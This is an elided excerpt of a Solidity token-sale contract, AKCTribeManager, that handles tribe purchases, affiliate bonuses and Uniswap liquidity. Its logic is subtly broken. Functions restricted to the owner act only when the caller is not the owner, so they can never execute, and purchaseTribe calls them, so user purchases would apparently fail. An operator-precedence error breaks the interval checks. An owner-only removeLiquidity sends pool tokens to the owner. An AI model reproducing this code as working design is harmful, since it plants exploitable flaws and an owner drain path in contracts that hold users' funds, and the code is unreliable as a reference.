...
contract AKCTribeManager is Ownable, ReentrancyGuard {
    ...
    uint256 public minimumEnforceBalance = 100 ether;

    uint256 public enforceCounter;
    uint256 public enforceInterval = 20;
    uint256 public toDistributorOffset = 5;
    uint256 public toReserveOffset = 10;
    uint256 public toLiquidityOffset = 15;
    ...
    uint256 public distributorReserved;
    ...
    /// @dev Core Events
    event PurchaseTribeEvent(address indexed purchaser, uint256 indexed spec);
    ...
    function createLp() external payable onlyOwner {
        require(akcWethPair == address(0), "AKC-WETH POOL ALREADY CREATED");
        akcWethPair = IUniswapV2Factory(router.factory())
                        .createPair(address(akcCoin), router.WETH());
        
        addLiquidity(akcCoin.balanceOf(address(this)), msg.value);
    }

    function removeLiquidity() external onlyOwner {
        require(akcWethPair != address(0), "AKC-WETH POOL NOT CREATED");
        IUniswapV2Pair(akcWethPair).burn(msg.sender);
    }
    ...
    function distributorSwap() public onlyOwner {
        bool minimumReached = distributorReserved >= minimumEnforceBalance;
        if (enforceTerms && minimumReached && msg.sender != owner()) {
            swapTokensForEth(distributorReserved);
            distributorReserved = 0;
        }
    }

    function accumulateReserveAndLiquidity() public onlyOwner {
        uint256 contractBalance = akcCoin.balanceOf(address(this));
        uint256 toSubstract = liquidityReserved + reserveReserved + distributorReserved;
        uint256 usableBalance = contractBalance >= toSubstract ? contractBalance - toSubstract : contractBalance;        
                        
        if (enforceTerms && msg.sender != owner()) {
            uint256 toReserve = usableBalance * reserveAllocation / 100;
            uint256 toLiquidity = usableBalance * liquidityAllocation / 100;
            uint256 toDistributor = usableBalance - toReserve - toLiquidity;
            
            reserveReserved += toReserve;
            liquidityReserved += toLiquidity;
            distributorReserved += toDistributor;
        }
    }
    ...
    function applyDiscount(uint256 price) internal view returns(uint256) {
        uint256 discount = akcCore.getDiscountFactor(msg.sender);
        return price * (100 - discount) / 100;
    }

    function applyAffiliate(uint256 price, address affiliate) internal returns(uint256) {
        if (affiliate != address(0) && affiliate != msg.sender) {
            uint256 bonus = price * akcCore.affiliatePercentage() / 100;
            akcReserve.releaseFunds(bonus, affiliate);
            akcCore.registerAffiliate(affiliate, bonus);
            price = price * (100 - akcCore.affiliateKickback()) / 100;
        }
        return price;
    }

    function purchaseTribe(uint256 spec, address affiliate)
        external
        nonReentrant { 
            ...
            price = applyAffiliate(price, affiliate);
            price = applyDiscount(price);
            
            require(akcCoin.balanceOf(msg.sender) >= price, "BALANCE TOO LOW");

            akcCoin.transferFrom(msg.sender, address(this), price);
            accumulateReserveAndLiquidity();

            if (enforceCounter % enforceInterval == 0) {  
                distributorSwap();
            } else if (enforceCounter + toDistributorOffset % enforceInterval == 0) {
                sendToDistributor();
            } else if (enforceCounter + toReserveOffset % enforceInterval == 0) {
                sendToReserve();
            } else if (enforceCounter + toLiquidityOffset % enforceInterval == 0) {
                sendToLiquidity();
            }

            enforceCounter++;

            akcCore.createSingleTribe(msg.sender, spec);
            emit PurchaseTribeEvent(msg.sender, spec);
        }
